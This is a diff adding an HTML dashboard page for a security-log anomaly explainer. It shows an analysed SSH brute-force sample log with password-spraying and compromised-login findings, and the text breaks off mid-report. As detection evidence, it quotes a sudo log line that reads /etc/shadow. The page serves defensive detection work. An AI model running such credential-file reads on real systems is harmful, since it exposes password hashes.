@@ -1,0 +1,457 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>LogMind - AI Security Log Anomaly Explainer</title>
+<meta name="description" content="Detects unusual patterns in security logs and explains them in plain language with risk level and recommended actions.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&family=Fira+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+/* ============================================================
+   LogMind - Data-Dense Dashboard
+   design system: ui-ux-pro-max (variance 6, motion 4, density 8)
+   palette: Financial Dashboard dark / Data-Dense light
+   type: Fira Sans + Fira Code   spacing: 4-32px
+   ============================================================ */
+:root{
+  --bg:#020617; --card:#0E1223; --card-2:#1A1E2F; --border:#334155;
+  --fg:#F8FAFC; --muted:#94A3B8; --primary:#2563EB; --primary-dim:#1E3A8A;
+  --on-primary:#fff; --high:#EF4444; --med:#F59E0B; --low:#22C55E; --ring:#3B82F6;
+  --mark:#3B82F633; --link:#8AB4FF;   /* --primary is a fill; --link is text on a surface */
+  --s1:4px; --s2:8px; --s3:12px; --s4:16px; --s5:24px; --s6:32px; --s7:48px;
+  --r:10px; --r-sm:6px;
+  --sans:"Fira Sans",system-ui,-apple-system,"Segoe UI",sans-serif;
+  --mono:"Fira Code",ui-monospace,Consolas,monospace;
+  --t:180ms cubic-bezier(.2,.8,.3,1);
+  --shadow:0 1px 2px rgba(0,0,0,.4),0 8px 24px rgba(0,0,0,.28);
+}
+:root[data-theme=light]{
+  --bg:#F8FAFC; --card:#fff; --card-2:#EEF2F7; --border:#CBD5E1;
+  --fg:#1E293B; --muted:#51607A; --primary:#1E40AF; --primary-dim:#DBEAFE;
+  --high:#B91C1C; --med:#8A6100; --low:#15803D; --ring:#1E40AF;
+  --mark:#1E40AF1f; --link:#1E40AF;
+  --shadow:0 1px 2px rgba(15,23,42,.06),0 8px 24px rgba(15,23,42,.07);
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--bg);color:var(--fg);font:15px/1.55 var(--sans);
+  -webkit-font-smoothing:antialiased}
+h1,h2,h3,h4{margin:0;line-height:1.25;font-weight:600}
+a{color:var(--link)}
+.wrap{max-width:1180px;margin:0 auto;padding:var(--s5) var(--s4) var(--s7)}
+.ic{width:16px;height:16px;flex:none}
+.skip{position:absolute;left:-9999px;background:var(--primary);color:#fff;
+  padding:var(--s2) var(--s3);border-radius:var(--r-sm);z-index:20}
+.skip:focus{left:var(--s3);top:var(--s2)}
+
+/* --- header ------------------------------------------------------------ */
+header.top{display:flex;align-items:center;gap:var(--s3);padding:var(--s3) var(--s4);
+  border-bottom:1px solid var(--border);background:color-mix(in srgb,var(--card) 88%,transparent);
+  backdrop-filter:blur(8px);position:sticky;top:0;z-index:10}
+.brand{display:flex;align-items:center;gap:var(--s2);font-weight:700;font-size:17px;
+  letter-spacing:-.01em}
+.brand .ic{width:20px;height:20px;color:var(--primary)}
+.tagline{color:var(--muted);font-size:13px;padding-left:var(--s3);
+  border-left:1px solid var(--border)}
+.spacer{flex:1}
+
+/* --- controls ---------------------------------------------------------- */
+.btn{font:inherit;font-weight:500;background:var(--primary);color:var(--on-primary);
+  border:1px solid transparent;border-radius:var(--r-sm);padding:var(--s2) var(--s4);
+  min-height:40px;cursor:pointer;display:inline-flex;align-items:center;gap:var(--s2);
+  transition:filter var(--t),background var(--t),border-color var(--t),transform var(--t)}
+.btn:hover{filter:brightness(1.12)}
+.btn:active{transform:translateY(1px)}
+.btn.ghost{background:transparent;color:var(--fg);border-color:var(--border)}
+.btn.ghost:hover{background:var(--card-2);border-color:var(--muted)}
+.btn[disabled]{opacity:.6;cursor:progress}
+select{font:inherit;background:var(--card-2);color:var(--fg);border:1px solid var(--border);
+  border-radius:var(--r-sm);padding:var(--s2) var(--s3);min-height:40px;cursor:pointer}
+:focus-visible{outline:2px solid var(--ring);outline-offset:2px;border-radius:4px}
+button:disabled{opacity:.4;cursor:not-allowed}
+@media (pointer:coarse){.btn,select,.chip{min-height:44px}}
+.spin{width:14px;height:14px;border:2px solid currentColor;border-right-color:transparent;
+  border-radius:50%;animation:rot .7s linear infinite;display:inline-block}
+@keyframes rot{to{transform:rotate(360deg)}}
+
+/* --- hero -------------------------------------------------------------- */
+.hero{padding:var(--s6) 0 var(--s5);max-width:720px}
+.hero h1{font-size:clamp(28px,4.5vw,42px);letter-spacing:-.02em;line-height:1.12}
+.lede{color:var(--muted);font-size:17px;margin:var(--s3) 0 var(--s4)}
+.facts{display:flex;flex-wrap:wrap;gap:var(--s5);list-style:none;padding:0;margin:0;
+  font-size:13px;color:var(--muted)}
+.facts strong{display:block;font-size:22px;color:var(--fg);font-weight:700}
+.steps{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));
+  gap:var(--s3);margin:var(--s5) 0}
+.step{background:var(--card);border:1px solid var(--border);border-radius:var(--r);
+  padding:var(--s4);display:flex;flex-direction:column;gap:var(--s2)}
+.step-ic{width:22px;height:22px;color:var(--primary)}
+.step strong{font-size:15px}
+.step span{color:var(--muted);font-size:14px}
+.section-h{font-size:14px;text-transform:uppercase;letter-spacing:.08em;
+  color:var(--muted);margin:var(--s6) 0 var(--s3)}
+.demos{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:var(--s3)}
+.demo{background:var(--card);border:1px solid var(--border);border-radius:var(--r);
+  padding:var(--s4);display:flex;flex-direction:column;gap:var(--s2);text-decoration:none;
+  color:var(--fg);transition:border-color var(--t),transform var(--t),box-shadow var(--t)}
+.demo:hover{border-color:var(--primary);transform:translateY(-2px);box-shadow:var(--shadow)}
+.demo span{color:var(--muted);font-size:14px}
+.d-ic{color:var(--primary)}
+.d-go{display:inline-flex;align-items:center;gap:6px;color:var(--link)!important;
+  font-size:13px;font-weight:500;margin-top:auto;padding-top:var(--s2)}
+
+/* --- input panel ------------------------------------------------------- */
+.panel{background:var(--card);border:1px solid var(--border);border-radius:var(--r);
+  padding:var(--s4);margin:var(--s5) 0}
+.panel h2{font-size:13px;text-transform:uppercase;letter-spacing:.08em;
+  color:var(--muted);margin-bottom:var(--s2);display:flex;align-items:center;gap:var(--s2)}
+label.hint{display:block;color:var(--muted);font-size:13px;margin-bottom:var(--s2)}
+textarea{width:100%;height:180px;resize:vertical;background:var(--bg);color:var(--fg);
+  border:1px solid var(--border);border-radius:var(--r-sm);padding:var(--s3);
+  font:13px/1.6 var(--mono);transition:border-color var(--t),box-shadow var(--t)}
+textarea:hover{border-color:var(--muted)}
+textarea:focus{box-shadow:0 0 0 3px color-mix(in srgb,var(--primary) 22%,transparent)}
+.panel.over{border-color:var(--primary);
+  background:color-mix(in srgb,var(--primary) 7%,var(--card))}
+.row{display:flex;flex-wrap:wrap;gap:var(--s2);align-items:center;margin-top:var(--s3)}
+.kbd{font:12px var(--mono);color:var(--muted);border:1px solid var(--border);
+  border-radius:4px;padding:1px 6px}
+
+/* --- status bar -------------------------------------------------------- */
+.statusbar{display:flex;flex-wrap:wrap;align-items:center;gap:var(--s4);
+  background:var(--card);border:1px solid var(--border);border-radius:var(--r);
+  padding:var(--s3) var(--s4);margin-bottom:var(--s4);position:sticky;top:60px;z-index:5}
+.sb-item{font-size:13px;color:var(--muted);font-variant-numeric:tabular-nums}
+.sb-item b{color:var(--fg);font-size:15px;margin-right:3px}
+.pill{display:inline-flex;align-items:center;gap:6px;font-weight:700;font-size:13px;
+  text-transform:uppercase;letter-spacing:.04em;padding:5px 10px;border-radius:999px;
+  border:1px solid currentColor}
+.risk-high{color:var(--high)}.risk-medium{color:var(--med)}.risk-low{color:var(--low)}
+
+/* --- chart ------------------------------------------------------------- */
+.chart{margin:0 0 var(--s4);background:var(--card);border:1px solid var(--border);
+  border-radius:var(--r);padding:var(--s3) var(--s4) var(--s2)}
+.chart figcaption{display:flex;justify-content:space-between;align-items:center;
+  flex-wrap:wrap;gap:var(--s2);font-size:13px;color:var(--muted);margin-bottom:var(--s3)}
+.cap{display:inline-flex;align-items:center;gap:var(--s2);font-weight:600;color:var(--fg)}
+.chart svg{width:100%;height:120px;display:block}
+.chart rect{transition:opacity var(--t)}
+.chart g:hover rect{opacity:.75}
+.b-fail{fill:var(--high)}.b-ok{fill:var(--low)}.b-other{fill:var(--border)}
+.legend{display:flex;gap:var(--s3);align-items:center}
+.legend i{width:10px;height:10px;border-radius:2px;display:inline-block;margin-right:5px}
+.k-fail{background:var(--high)}.k-ok{background:var(--low)}.k-other{background:var(--border)}
+.axis{display:flex;justify-content:space-between;font:12px/1 var(--mono);
+  color:var(--muted);padding-top:var(--s2)}
+.datatable{margin-top:var(--s2);border-top:1px solid var(--border);padding-top:var(--s2)}
+.datatable summary{cursor:pointer;font-size:13px;color:var(--muted);
+  padding:var(--s1) 0;list-style-position:inside}
+.datatable summary:hover{color:var(--fg)}
+
+/* --- results grid ------------------------------------------------------ */
+.grid{display:grid;grid-template-columns:minmax(0,1fr);gap:var(--s4);align-items:start}
+.col-main{min-width:0}
+@media (min-width:1024px){
+  .grid{grid-template-columns:minmax(0,1fr) 304px}
+  .side{position:sticky;top:132px}
+}
+.side{display:flex;flex-direction:column;gap:var(--s3)}
+.toolbar{display:flex;flex-wrap:wrap;gap:var(--s2);align-items:center;
+  margin-bottom:var(--s3)}
+.chips{display:flex;gap:var(--s2);flex-wrap:wrap}
+.chip{font:inherit;font-size:13px;background:var(--card);color:var(--fg);
+  border:1px solid var(--border);border-radius:999px;padding:6px var(--s3);
+  min-height:34px;cursor:pointer;transition:background var(--t),border-color var(--t),
+  color var(--t)}
+.chip:hover:not(:disabled){border-color:var(--primary)}
+.chip.on{background:var(--primary);color:var(--on-primary);border-color:var(--primary)}
+.chip .cnt{opacity:.75;font-variant-numeric:tabular-nums}
+
+/* --- cards ------------------------------------------------------------- */
+.card{background:var(--card);border:1px solid var(--border);
+  border-left:3px solid var(--border);border-radius:var(--r);padding:var(--s4);
+  margin-bottom:var(--s3);transition:box-shadow var(--t),border-color var(--t)}
+.side .card,.gauge-card{margin-bottom:0}
+.col-main .card:hover{box-shadow:var(--shadow)}
+.card header{display:flex;align-items:center;gap:var(--s3);flex-wrap:wrap;
+  margin-bottom:var(--s2)}
+.card h3{font-size:16px;display:flex;align-items:center;gap:var(--s2);flex:1 1 220px}
+.card p{margin:0 0 var(--s3)}
+.sev{display:inline-flex;align-items:center;gap:6px;font-size:11px;font-weight:700;
+  text-transform:uppercase;letter-spacing:.06em;padding:4px 9px;border-radius:999px;
+  border:1px solid currentColor}
+.sev-High{border-left-color:var(--high)}   .sev-High .sev{color:var(--high)}
+.sev-Medium{border-left-color:var(--med)}  .sev-Medium .sev{color:var(--med)}
+.sev-Low{border-left-color:var(--low)}     .sev-Low .sev{color:var(--low)}
+.card.ai{border-left-color:var(--primary)} .card.ai .sev{color:var(--primary)}
+pre{background:var(--bg);border:1px solid var(--border);border-radius:var(--r-sm);
+  padding:var(--s3);overflow-x:auto;margin:0 0 var(--s3)}
+code{font:12.5px/1.7 var(--mono);color:var(--muted);white-space:pre}
+code b{color:var(--fg);font-weight:500}
+mark{background:var(--mark);color:var(--fg);border-radius:3px;padding:0 3px;
+  font-weight:500}
+.actions h4{font-size:11px;text-transform:uppercase;letter-spacing:.06em;
+  color:var(--muted);margin-bottom:var(--s2);display:flex;align-items:center;gap:6px}
+.actions ol{margin:0;padding-left:var(--s5)}
+.actions li{margin:3px 0}
+.actions li::marker{color:var(--muted);font-variant-numeric:tabular-nums}
+.card footer{display:flex;gap:var(--s2);flex-wrap:wrap;align-items:center;
+  margin-top:var(--s3);padding-top:var(--s3);border-top:1px solid var(--border)}
+.tag{font:12px var(--mono);background:var(--card-2);color:var(--muted);
+  padding:2px 8px;border-radius:4px}
+.mitre{font:12px var(--mono);color:var(--link);background:var(--card-2);
+  padding:3px 8px;border-radius:4px;text-decoration:none;margin-left:auto;
+  transition:background var(--t)}
+.mitre:hover{background:var(--primary-dim)}
+
+/* --- gauge + breakdown ------------------------------------------------- */
+.gauge-card{display:flex;flex-direction:column;align-items:center;gap:var(--s3);
+  border-left-color:currentColor}
+.gauge{width:100%;max-width:190px;height:auto;display:block}
+.g-num{font:700 26px var(--sans);fill:var(--fg);text-anchor:middle}
+.g-lab{font:600 9px var(--sans);fill:var(--muted);text-anchor:middle;letter-spacing:.1em}
+.bars{width:100%;display:flex;flex-direction:column;gap:6px}
+.brow{display:grid;grid-template-columns:58px 1fr 22px;align-items:center;gap:var(--s2);
+  font-size:12px}
+.brow b{text-align:right;font-variant-numeric:tabular-nums;color:var(--fg)}
+.btrack{height:6px;background:var(--card-2);border-radius:99px;overflow:hidden}
+.bfill{display:block;height:100%;border-radius:99px;transition:width 420ms var(--t)}
+.sev-bg-High{background:var(--high)}.sev-bg-Medium{background:var(--med)}
+.sev-bg-Low{background:var(--low)}
+
+/* --- tables ------------------------------------------------------------ */
+.scroll{overflow-x:auto}
+table{width:100%;border-collapse:collapse;font-size:14px}
+table.mini{font-size:12.5px}
+th{text-align:left;font-size:11px;text-transform:uppercase;letter-spacing:.06em;
+  color:var(--muted);font-weight:600;padding:var(--s2) var(--s1);
+  border-bottom:1px solid var(--border);white-space:nowrap}
+td{padding:var(--s2) var(--s1);border-bottom:1px solid var(--border);
+  font-variant-numeric:tabular-nums}
+tbody tr{transition:background var(--t)}
+tbody tr:hover{background:var(--card-2)}
+tbody tr:last-child td{border-bottom:0}
+.mono{font-family:var(--mono)}
+.verdict{display:inline-flex;align-items:center;gap:5px;font-size:12px}
+.verdict .ic{width:13px;height:13px}
+.verdict.bad{color:var(--high)}.verdict.good{color:var(--low)}
+.exports{display:flex;flex-direction:column;gap:var(--s2)}
+.exports .btn{justify-content:flex-start}
+.side h3{font-size:13px;text-transform:uppercase;letter-spacing:.06em;
+  color:var(--muted);display:flex;align-items:center;gap:var(--s2);margin-bottom:var(--s2)}
+.note{color:var(--muted);font-size:14px;border-left:2px solid var(--med);
+  padding:var(--s2) var(--s3);background:var(--card);border-radius:0 var(--r-sm) var(--r-sm) 0}
+
+/* --- motion (standard tier: stagger in, 320ms) -------------------------- */
+@keyframes rise{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+.card,.step,.demo{animation:rise 320ms cubic-bezier(.2,.9,.3,1.15) backwards;
+  animation-delay:calc(var(--i,0) * 45ms)}
+@media (prefers-reduced-motion:reduce){
+  html{scroll-behavior:auto}
+  *{animation:none!important;transition-duration:1ms!important}
+}
+
+/* --- responsive -------------------------------------------------------- */
+@media (max-width:760px){
+  .wrap{padding:var(--s4) var(--s3) var(--s6)}
+  .tagline{display:none}
+  .statusbar{position:static;gap:var(--s3)}
+  .card h3{font-size:15px}
+  .mitre{margin-left:0}
+  .chip{min-height:44px}
+  .facts{gap:var(--s4)}
+}
+@media print{
+  header.top,.panel,.toolbar,.exports,.hero,.steps,.demos,.section-h,
+  .datatable,.skip{display:none!important}
+  body{background:#fff;color:#000}
+  .grid{grid-template-columns:1fr}
+  .card,.chart,.statusbar{border:1px solid #999;box-shadow:none;break-inside:avoid}
+  a[href^="http"]::after{content:" (" attr(href) ")";font-size:10px;color:#555}
+}
+</style>
+</head>
+<body>
+<a class="skip" href="#log">Skip to log input</a>
+<header class="top">
+  <span class="brand">
+    <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+      stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+      <path d="M12 2 4 5v6c0 5 3.4 9.3 8 11 4.6-1.7 8-6 8-11V5l-8-3z"/></svg>
+    LogMind</span>
+  <span class="tagline">AI security log anomaly explainer</span>
+  <span class="spacer"></span>
+  <button id="theme" class="btn ghost" aria-label="Switch colour theme">
+    <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+      stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+      <path d="M21 12.8A9 9 0 1111.2 3a7 7 0 009.8 9.8z"/></svg>
+    <span id="themeLabel">Light</span></button>
+</header>
+
+<main class="wrap">
+  <section class="hero"><h1>Understand your security logs in seconds</h1><p class="lede">LogMind reads raw log files, finds the patterns that matter, and explains each one in plain language with a risk level, the evidence, the MITRE ATT&amp;CK technique, and the actions to take. Ten detectors, measured at 0.89 macro F1 on a 105-log labelled benchmark. Python standard library only.</p><ul class="facts"><li><strong>10</strong> detectors</li><li><strong>0.89</strong> macro F1</li><li><strong>0</strong> dependencies</li><li><strong>3</strong> reports below</li></ul></section>
+
+  <p class="note">Static snapshot of three analysed logs &mdash; the live tool (paste your own log, filter, export) runs locally with <code>python logmind.py</code>. Source: <a href="https://github.com/">github repository</a>.</p>
+
+  <h2 class="section-h"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M13 2 3 14h9l-1 8 10-12h-9z"/></svg> Report 1 &mdash; SSH brute force</h2><p class="lede" style="font-size:15px">15 failed logins then a success, plus password spraying and a botnet spreading attempts. Source file: <code>samples/brute_force.log</code></p><div id="results1" tabindex="-1">
+<div class="statusbar"><span class="pill risk-high"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2 4 5v6c0 5 3.4 9.3 8 11 4.6-1.7 8-6 8-11V5l-8-3z"/></svg>High risk</span><span class="sb-item"><b>8</b> findings</span><span class="sb-item"><b>52</b> events</span><span class="sb-item"><b>31</b> failed</span><span class="sb-item"><b>10</b> source IPs</span><span class="sb-item">7h 18m</span></div>
+<figure class="chart"><figcaption><span class="cap"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>Event timeline</span><span class="legend"><i class="k-fail"></i>failed<i class="k-ok"></i>accepted<i class="k-other"></i>other</span></figcaption><svg viewBox="0 0 100 96" preserveAspectRatio="none" role="img" aria-label="Event volume over time, peak 33 events per 15min"><g><title>09:02 - 4 events (1 failed, 2 accepted)</title><rect class="b-other" x="0.140" y="93.09" width="3.053" height="2.91" rx="0.15"/><rect class="b-ok" x="0.140" y="87.27" width="3.053" height="5.82" rx="0.15"/><rect class="b-fail" x="0.140" y="84.36" width="3.053" height="2.91" rx="0.15"/></g><g><title>09:17 - 2 events (0 failed, 2 accepted)</title><rect class="b-ok" x="3.473" y="90.18" width="3.053" height="5.82" rx="0.15"/></g><g><title>09:32 - 2 events (0 failed, 1 accepted)</title><rect class="b-other" x="6.807" y="93.09" width="3.053" height="2.91" rx="0.15"/><rect class="b-ok" x="6.807" y="90.18" width="3.053" height="2.91" rx="0.15"/></g><g><title>09:47 - 1 events (0 failed, 0 accepted)</title><rect class="b-other" x="10.140" y="93.09" width="3.053" height="2.91" rx="0.15"/></g><g><title>10:02 - 1 events (0 failed, 0 accepted)</title><rect class="b-other" x="13.473" y="93.09" width="3.053" height="2.91" rx="0.15"/></g><g><title>10:17 - 1 events (0 failed, 1 accepted)</title><rect class="b-ok" x="16.807" y="93.09" width="3.053" height="2.91" rx="0.15"/></g><g><title>10:47 - 1 events (0 failed, 1 accepted)</title><rect class="b-ok" x="23.473" y="93.09" width="3.053" height="2.91" rx="0.15"/></g><g><title>12:02 - 1 events (0 failed, 1 accepted)</title><rect class="b-ok" x="40.140" y="93.09" width="3.053" height="2.91" rx="0.15"/></g><g><title>13:47 - 1 events (0 failed, 0 accepted)</title><rect class="b-other" x="63.473" y="93.09" width="3.053" height="2.91" rx="0.15"/></g><g><title>14:17 - 33 events (30 failed, 2 accepted)</title><rect class="b-other" x="70.140" y="93.09" width="3.053" height="2.91" rx="0.15"/><rect class="b-ok" x="70.140" y="87.27" width="3.053" height="5.82" rx="0.15"/><rect class="b-fail" x="70.140" y="0.00" width="3.053" height="87.27" rx="0.15"/></g><g><title>14:32 - 2 events (0 failed, 1 accepted)</title><rect class="b-other" x="73.473" y="93.09" width="3.053" height="2.91" rx="0.15"/><rect class="b-ok" x="73.473" y="90.18" width="3.053" height="2.91" rx="0.15"/></g><g><title>15:02 - 1 events (0 failed, 1 accepted)</title><rect class="b-ok" x="80.140" y="93.09" width="3.053" height="2.91" rx="0.15"/></g><g><title>15:47 - 1 events (0 failed, 1 accepted)</title><rect class="b-ok" x="90.140" y="93.09" width="3.053" height="2.91" rx="0.15"/></g><g><title>16:17 - 1 events (0 failed, 1 accepted)</title><rect class="b-ok" x="96.807" y="93.09" width="3.053" height="2.91" rx="0.15"/></g></svg><div class="axis"><span>Aug 10 09:02</span><span>1 bar = 15min</span><span>Aug 10 16:20</span></div><details class="datatable"><summary>Show the numbers</summary><div class="scroll"><table><thead><tr><th>Time</th><th>Failed</th><th>Accepted</th><th>Other</th><th>Total</th></tr></thead><tbody><tr><td class="mono">Aug 10 09:02</td><td>1</td><td>2</td><td>1</td><td>4</td></tr><tr><td class="mono">Aug 10 09:17</td><td>0</td><td>2</td><td>0</td><td>2</td></tr><tr><td class="mono">Aug 10 09:32</td><td>0</td><td>1</td><td>1</td><td>2</td></tr><tr><td class="mono">Aug 10 09:47</td><td>0</td><td>0</td><td>1</td><td>1</td></tr><tr><td class="mono">Aug 10 10:02</td><td>0</td><td>0</td><td>1</td><td>1</td></tr><tr><td class="mono">Aug 10 10:17</td><td>0</td><td>1</td><td>0</td><td>1</td></tr><tr><td class="mono">Aug 10 10:47</td><td>0</td><td>1</td><td>0</td><td>1</td></tr><tr><td class="mono">Aug 10 12:02</td><td>0</td><td>1</td><td>0</td><td>1</td></tr><tr><td class="mono">Aug 10 13:47</td><td>0</td><td>0</td><td>1</td><td>1</td></tr><tr><td class="mono">Aug 10 14:17</td><td>30</td><td>2</td><td>1</td><td>33</td></tr><tr><td class="mono">Aug 10 14:32</td><td>0</td><td>1</td><td>1</td><td>2</td></tr><tr><td class="mono">Aug 10 15:02</td><td>0</td><td>1</td><td>0</td><td>1</td></tr><tr><td class="mono">Aug 10 15:47</td><td>0</td><td>1</td><td>0</td><td>1</td></tr><tr><td class="mono">Aug 10 16:17</td><td>0</td><td>1</td><td>0</td><td>1</td></tr></tbody></table></div></details></figure>
+<div class="grid">
+<div class="col-main">
+<article class="card sev-High" data-sev="High" style="--i:0"><header><span class="sev"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2a10 10 0 100 20 10 10 0 000-20zM2 12h20M12 2a15 15 0 010 20 15 15 0 010-20z"/></svg>High</span><h3>Account &#x27;carol&#x27; attacked from 4 different IPs</h3></header><p>19 failed logins for &#x27;carol&#x27; arrived from 4 source addresses (192.0.2.31, 192.0.2.77, 198.51.100.90, 203.0.113.45). One person does not log in from four networks at once - this is a botnet or proxy pool spreading attempts to dodge per-IP blocking. A successful login for this account also appears in the log.</p><pre><code>Aug 10 14:29:10 web01 sshd[3101]: <b>Failed password</b> for <mark>carol</mark> from <mark>192.0.2.31</mark> port 55002 ssh2
+Aug 10 14:29:38 web01 sshd[3102]: <b>Failed password</b> for <mark>carol</mark> from <mark>192.0.2.31</mark> port 55010 ssh2
+Aug 10 14:30:04 web01 sshd[3110]: <b>Failed password</b> for <mark>carol</mark> from <mark>198.51.100.90</mark> port 41120 ssh2</code></pre><div class="actions"><h4><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Recommended actions</h4><ol><li>Reset the password for &#x27;carol&#x27; and enable MFA</li><li>Block the source range, not just single IPs</li><li>Check whether the same IPs appear against other accounts</li></ol></div><footer><span class="tag">192.0.2.31</span><span class="tag">192.0.2.77</span><span class="tag">198.51.100.90</span><span class="tag">carol</span><a class="mitre" target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1110/003/" title="Open this technique on attack.mitre.org">T1110.003 Brute Force: Password Spraying</a></footer></article>
+<article class="card sev-High" data-sev="High" style="--i:1"><header><span class="sev"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M17 21v-2a4 4 0 00-4-4H6a4 4 0 00-4 4v2M9.5 7a3.5 3.5 0 107 0 3.5 3.5 0 10-7 0M23 21v-2a4 4 0 00-3-3.9"/></svg>High</span><h3>One source probing many accounts (198.51.100.77)</h3></header><p>198.51.100.77 tried 8 different usernames (admin, git, jenkins, oracle, postgres, root...). Spreading attempts across accounts is password spraying or credential stuffing - it is designed to stay under the lockout threshold on any single account.</p><pre><code>Aug 10 14:22:01 web01 sshd[3001]: <b>Failed password</b> for <b>invalid user</b> <mark>admin</mark> from <mark>198.51.100.77</mark> port 33012 ssh2
+Aug 10 14:22:03 web01 sshd[3002]: <b>Failed password</b> for <b>invalid user</b> <mark>root</mark> from <mark>198.51.100.77</mark> port 33018 ssh2
+Aug 10 14:22:05 web01 sshd[3003]: <b>Failed password</b> for <b>invalid user</b> <mark>test</mark> from <mark>198.51.100.77</mark> port 33024 ssh2</code></pre><div class="actions"><h4><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Recommended actions</h4><ol><li>Block 198.51.100.77 and check its reputation before unblocking</li><li>Check each named account for a successful login</li><li>Ban the usernames that do not exist on this host at the edge</li></ol></div><footer><span class="tag">198.51.100.77</span><span class="tag">admin</span><span class="tag">git</span><span class="tag">jenkins</span><a class="mitre" target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1110/003/" title="Open this technique on attack.mitre.org">T1110.003 Brute Force: Password Spraying</a></footer></article>
+<article class="card sev-High" data-sev="High" style="--i:2"><header><span class="sev"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 17l6-6-6-6M12 19h8"/></svg>High</span><h3>Sensitive activity: credential file access</h3></header><p>1 log line(s) show credential file access by carol. On a normal day this appears during planned admin work and nowhere else. Outside a change window it is one of the strongest signals that someone is already inside.</p><pre><code>Aug 10 14:32:02 web01 sudo: <mark>carol</mark> : TTY=pts/3 ; PWD=/root ; <b>COMMAND=/usr/bin/cat</b> /etc/shadow</code></pre><div class="actions"><h4><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Recommended actions</h4><ol><li>Match this against an approved change or ticket</li><li>Ask the account owner directly - do not assume it was them</li><li>If unexplained, isolate the host and preserve the logs now</li></ol></div><footer><span class="tag">carol</span><a class="mitre" target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1003/008/" title="Open this technique on attack.mitre.org">T1003.008 OS Credential Dumping: /etc/passwd and /etc/shadow</a></footer></article>
+<article class="card sev-High" data-sev="High" style="--i:3"><header><span class="sev"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 11h14v10H5zM8 11V7a4 4 0 018 0v4"/></svg>High</span><h3>Successful login after repeated failures (203.0.113.45)</h3></header><p>203.0.113.45 failed 15 times, then logged in successfully as &#x27;carol&#x27;. That is the shape of a brute-force attempt that worked. Treat the account as compromised until you can prove otherwise.</p><pre><code>Aug 10 14:31:02 web01 sshd[3120]: <b>Failed password</b> for <mark>carol</mark> from <mark>203.0.113.45</mark> port 60122 ssh2
+Aug 10 14:31:05 web01 sshd[3121]: <b>Failed password</b> for <mark>carol</mark> from <mark>203.0.113.45</mark> port 60128 ssh2
+Aug 10 14:31:08 web01 sshd[3122]: <b>Failed password</b> for <mark>carol</mark> from <mark>203.0.113.45</mark> port 60134 ssh2
+Aug 10 14:31:47 web01 sshd[3135]: <b>Accepted password</b> for <mark>carol</mark> from <mark>203.0.113.45</mark> port 60215 ssh2</code></pre><div class="actions"><h4><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Recommended actions</h4><ol><li>Force a password reset and end active sessions for the account</li><li>Block 203.0.113.45 at the firewall</li><li>Review every command and file touched after the login time</li><li>Enable MFA on this account</li></ol></div><footer><span class="tag">203.0.113.45</span><span class="tag">carol</span><a class="mitre" target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1110/" title="Open this technique on attack.mitre.org">T1110 Brute Force</a></footer></article>
+<article class="card sev-Medium" data-sev="Medium" style="--i:4"><header><span class="sev"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>Medium</span><h3>Event volume spike at 14:31</h3></header><p>16 events in a single minute against a typical 1. A sudden flood usually means a scan, a service failing in a loop, or someone generating noise to bury the events that matter.</p><pre><code>Aug 10 14:31:02 web01 sshd[3120]: <b>Failed password</b> for carol from 203.0.113.45 port 60122 ssh2
+Aug 10 14:31:05 web01 sshd[3121]: <b>Failed password</b> for carol from 203.0.113.45 port 60128 ssh2
